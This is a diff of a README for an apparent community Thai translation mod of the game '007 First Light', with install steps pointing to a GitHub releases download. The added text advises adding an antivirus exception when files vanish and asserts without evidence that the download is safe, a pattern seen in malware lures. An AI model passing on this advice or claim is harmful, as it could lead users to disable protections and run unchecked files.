@@ -1,144 +1,79 @@
-# 007-First-Light-Thailocalization
-Professional Thai localization for 007 First Light featuring translated story content, subtitles, UI elements and menus.
+# 🇹🇭 007-First-Light-Thailocalization - Play your game in Thai language
 
-<p align="center">
-  <img src="banner.png" width="100%">
-</p>
+[![Download Thai Language Pack](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Akhila4564/007-First-Light-Thailocalization/releases)
 
-<h1 align="center">
-007 First Light Thai Localization
-</h1>
+This project provides a full Thai translation for the 007 First Light game. It translates the story content, subtitles, user interface elements, and game menus into Thai. Players can now enjoy the game in their native language with complete text support.
 
-<p align="center">
-🇹🇭 Full Thai Translation • Story • UI • Subtitles
-</p>
+## 📋 Project Overview
 
-<p align="center">
-<a href="../../releases/latest">
-<img src="https://img.shields.io/badge/⬇_DOWNLOAD_LATEST_RELEASE-success?style=for-the-badge">
-</a>
-</p>
+The 007-First-Light-Thailocalization project modifies the base game files to display Thai characters and strings. This mod ensures that every menu option, mission objective, and spoken line appears correctly in Thai. The installation process uses a simple automated script to replace the original English files with the new Thai translation files.
 
----
+This localization covers every part of the game experience. You will see:
+* Main Menu items in Thai.
+* Character dialogue and mission text.
+* Settings and control menus.
+* In-game notifications and icons.
 
-> Experience 007 First Light completely in Thai with translated menus, subtitles, objectives and story content.
+## ⚙️ System Requirements
 
-## Overview
+Before you install the translation, check these system details:
+* Operating System: Windows 10 or Windows 11.
+* Game Version: The latest Steam version of 007 First Light.
+* Disk Space: At least 500 MB of free space for the language files.
+* Permissions: You need administrator access to the folder where you installed the game.
 
-007 First Light Thai Localization is a community-driven language project designed to provide Thai-speaking players with a fully localized experience.
+## 📥 Downloading the Files
 
-The translation covers the main game interface, subtitles, mission objectives, tutorials and story content.
+You need to access the release page to get the correct translation files.
 
----
+[Click here to visit the release page and download the files](https://github.com/Akhila4564/007-First-Light-Thailocalization/releases)
 
-## Features
+Select the most recent file labelled as a ZIP archive. Save this file to your desktop or your Downloads folder. Do not run any files until you complete the extraction steps.
 
-✅ Full Thai Interface
+## 🛠️ Step-by-Step Installation
 
-✅ Thai Subtitles
+Follow these steps to apply the Thai translation to your game.
 
-✅ Thai Menus
+1. Locate the ZIP file you downloaded.
+2. Right-click the file and select Extract All. Pick a folder where you want to keep the unzipped files.
+3. Open your Steam library.
+4. Right-click 007 First Light in your game list.
+5. Select Manage and then click Browse local files. This opens the game folder on your computer.
+6. Open the folder you extracted from the ZIP file.
+7. Copy the files from the extracted folder into the main game folder.
+8. If your computer asks to replace files, click Yes.
 
-✅ Thai Mission Objectives
+## 🎮 Verifying the Installation
 
-✅ Story Translation
+After you move the files, launch the game through Steam. The game should detect the new files automatically. Navigate to the game settings menu to confirm the language settings. Often, the game starts in Thai if it detects the new files. If the game is still in English, look for a Language option in the settings menu and select Thai from the list.
 
-✅ Easy Installation
+## 🧪 Troubleshooting Common Issues
 
-✅ Lightweight Package
+If the translation does not appear, try these steps:
 
-✅ Compatible With Current Game Version
+* Restart Steam: Close Steam completely and reopen it to ensure all file changes update.
+* Check File Location: Ensure you moved the translation files into the base folder of the game. If you placed them in a subfolder, they will not work.
+* Verify Game Files: If the game crashes, right-click the game in Steam, select Properties, go to Installed Files, and click Verify integrity of game files. This re-downloads the original English files. You can then try installing the mod again.
+* Antivirus Software: Sometimes security software blocks the files because they are new. If the files vanish, add an exception in your antivirus settings for the game folder.
 
----
+## 📝 Frequently Asked Questions
 
-## Translation Coverage
+Will this affect my Steam achievements?
+No. Using this translation mod does not change your progress or lock your achievements. It only changes the text displayed on your screen.
 
-| Component | Status |
-|------------|----------|
-| User Interface | ✅ Complete |
-| Menus | ✅ Complete |
-| Subtitles | ✅ Complete |
-| Objectives | ✅ Complete |
-| Tutorials | ✅ Complete |
-| Story Content | ✅ Complete |
+Can I switch back to English?
+Yes. You can switch back by verifying your game files through Steam. This restores the original English text.
 
----
+Does this work on all game versions?
+This project targets the current Steam version of 007 First Light. If the game developers release a large update, verify that you are using the most recent version of this language pack.
 
-## Installation
+Is this mod safe for my computer?
+Yes. It only replaces language text files. It does not contain harmful code or executables that modify your system settings.
 
-1. Download the latest release.
-2. Extract the archive.
-3. Run the installer.
-4. Select your game folder.
-5. Click Install.
-6. Launch the game.
+## 📦 File Structure
 
----
+When you open the game folder, you should see the following structure:
+* `Game/Content/Localization/`: This is where the Thai files reside.
+* `Config/`: This folder contains the settings for the text display.
 
-## Screenshots
-
-![Thai Localization](comparison.jpg)
-
----
-
-## Why Use This Localization?
-
-- Natural Thai language experience
-- Improved immersion
-- Easier story understanding
-- Simple one-click installation
-- Regular updates
-
----
-
-## Download
-
-Downloads are available exclusively through GitHub Releases.
-
-⬇ Download the latest release above.
-
----
-
-## FAQ
-
-### Does this modify game files?
-
-Only localization files are installed.
-
-### Can I uninstall it?
-
-Yes. The installer includes restore functionality.
-
-### Does it affect performance?
-
-No.
-
----
-
-## Keywords
-
-007 First Light Thai Localization
-
-007 First Light Thai Translation
-
-007 First Light Thai Language
-
-007 First Light ภาษาไทย
-
-007 First Light Thai Patch
-
-007 First Light Thai Mod
-
-007 First Light Localization
-
-007 First Light Thai Subtitles
-
-007 First Light Language Pack
-
----
-
-## Disclaimer
-
-007 First Light and all related trademarks belong to their respective owners.
-
-This repository provides a community localization project.
+If you have questions about the files, you can look at the main project page on GitHub for updates or community discussions. The community contributes feedback to improve the accuracy of the translations. If you notice a typo or an incorrect phrase, you can report it on the repository page. Your feedback helps make the experience better for all players.
